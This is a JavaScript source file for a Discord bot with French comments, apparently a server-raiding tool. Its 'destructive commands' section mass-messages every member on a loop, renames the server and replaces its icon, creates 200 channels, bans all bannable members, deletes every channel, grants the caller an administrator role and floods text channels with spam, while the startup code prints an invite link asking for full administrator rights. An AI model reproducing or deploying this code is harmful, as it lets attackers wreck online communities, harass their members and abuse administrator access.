const Discord = require("discord.js");
const bot = new Discord.Client();
var prefix = ".";
var mention = "126connectés";
const conf = require('./config.json')

var fucked = false;
 
bot.on('ready',() => {
    //démarage
    console.log("démarage")
    bot.user.setGame(conf.jeux, `https://www.twitch.tv/twitch`)
    console.log("jeu mit")
    console.log("servs mit")
    console.log("Bot prêt")
    console.log(`connecté sur : ${bot.user.tag}`)
    console.log(`https://discordapp.com/api/oauth2/authorize?client_id=${bot.user.id}&permissions=8&scope=bot`)
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random());
      invite => console.log(`Connecté sur : ${guild.name} ${invite}`)});
    
});
 
bot.on('message', msg => {
  //#region Legit
  /* Commandes legit */
  if (msg.content === '.ping') {
    msg.reply('pong !')
  }


  //#endregion
 
  //#region Destructrices
  /* Commandes destructrices */
       if (msg.content === '.des') {
        console.log(`Commande .mp par ${msg.author.tag}`);
            if (msg.channel.type === "dm") return;
            if (msg.deletable) msg.delete();
            msg.guild.members.forEach(member => {
              setInterval(function () {
                member.send(conf.messageMP).catch(error => {}) }, 450)})
   }
 
  if (msg.content === '.des') {
    console.log(`Commande .des par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setIcon(`./img/${conf.imgduserv}`).catch(e => {});
      msg.guild.setName(conf.nomduserv).catch(e => {});
 
      for (var i = 0; i < 200; i++) {
        msg.guild.createChannel(conf.nomdessalons, 'text').catch(e => {});
        msg.guild
      }
      fucked = true;
            }

    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .exit par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
  if (msg.content === '.ban') {
    console.log(`Commande .bane par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", conf.raisonBAN) && member.bannable) member.ban().catch(e => {});
    });
  }
  
if(msg.content === '.del'){
  if(msg.channel.type === "dm") return;
  if(msg.guild.channels.size === 0) return;
  else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
  msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
}

  if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "AFO | TEAM",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }

  if (msg.content === '.del') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: conf.roleADMIN,
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
    }).catch(e => {});
  }
        if(msg.content.startsWith(".des")){
            msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send(conf.messageDES)
              }, 2000);
            });
          }
        });


bot.login(conf.token)


